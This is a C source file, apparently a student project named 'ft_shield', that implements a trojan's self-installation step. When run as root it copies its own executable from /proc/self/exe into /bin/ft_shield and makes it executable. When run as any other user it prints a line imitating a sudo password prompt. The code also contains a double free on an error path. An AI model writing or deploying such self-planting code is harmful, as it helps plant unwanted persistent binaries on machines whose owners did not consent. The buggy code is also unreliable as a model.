#include "../include/ft_shield.h"

void    ft_payload(t_troyan *shield)
{
    shield->fd = fopen("/proc/self/exe", "r");
    if (!shield->fd)
    {
        printf("ERROR: failed to open exe file\n");
        free(shield);
        return;
    }
    shield->fd_dest = fopen("/bin/ft_shield", "wb");
    if (!shield->fd_dest)
    {
        printf("ERROR: failed to open bin file\n");
        fclose(shield->fd);
        free(shield);
        return;
    }
    while ((shield->bytes_read = fread(shield->buffer_exe, 1, 1024, shield->fd)) != 0)
        fwrite(shield->buffer_exe, 1, shield->bytes_read, shield->fd_dest);
    printf("( %p )\n", shield->fd_dest);
    fclose(shield->fd);
    fclose(shield->fd_dest);
    chmod("/bin/ft_shield", 0755);
}

int main()
{
    t_troyan    *shield;

    shield = malloc(sizeof(t_troyan));
    if (!shield)
        return (1);
    shield->pwd = getpwuid(getuid());
    if (!shield->pwd)
    {
        free(shield);
        return (1);
    }
    if (shield->pwd->pw_uid)
    {
        printf("[sudo] password for %s \n", shield->pwd->pw_name);
        free(shield);
        return (1);
    }
    printf("%s\n", shield->pwd->pw_name);
    ft_payload(shield);
    free(shield);
    return (0);
}
